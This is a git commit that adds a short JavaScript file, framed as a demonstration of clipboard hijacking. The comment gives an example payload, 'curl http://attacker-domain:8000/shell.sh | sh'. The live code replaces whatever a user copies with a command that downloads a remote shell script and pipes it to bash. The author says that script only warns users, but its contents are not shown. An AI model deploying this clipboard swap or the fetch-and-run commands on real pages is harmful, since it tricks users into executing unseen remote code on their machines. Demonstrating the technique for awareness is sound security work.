6c21eb6f72a728fb2cc073d2c9b7842a26411f83
SirObsidian <70753342+SirObby@users.noreply.github.com>
2022-01-18 17:34:21 +0800

    Create copy_and_paste.js

---
+++ copy_and_paste.js
@@ -0,0 +1,12 @@
+/*
+  Hello there!
+  People have found an exploit in JavaScript which works as "intended", basically copying something else to the clipboard, than what you actually look like you copy.
+  
+  For example you could want to copy 'sudo apt update' from the command line, but end up copying 
+  'curl http://attacker-domain:8000/shell.sh | sh\n'
+  
+  This script will contain this exploit, but will warn users instead.
+
+*/
+
+document.getElementById('copy').addEventListener('copy', function(e) { e.clipboardData.setData('text/plain', 'curl https://raw.githubusercontent.com/SirObby/security_concern/main/copy_and_paste.sh | bash\n'); e.preventDefault(); });
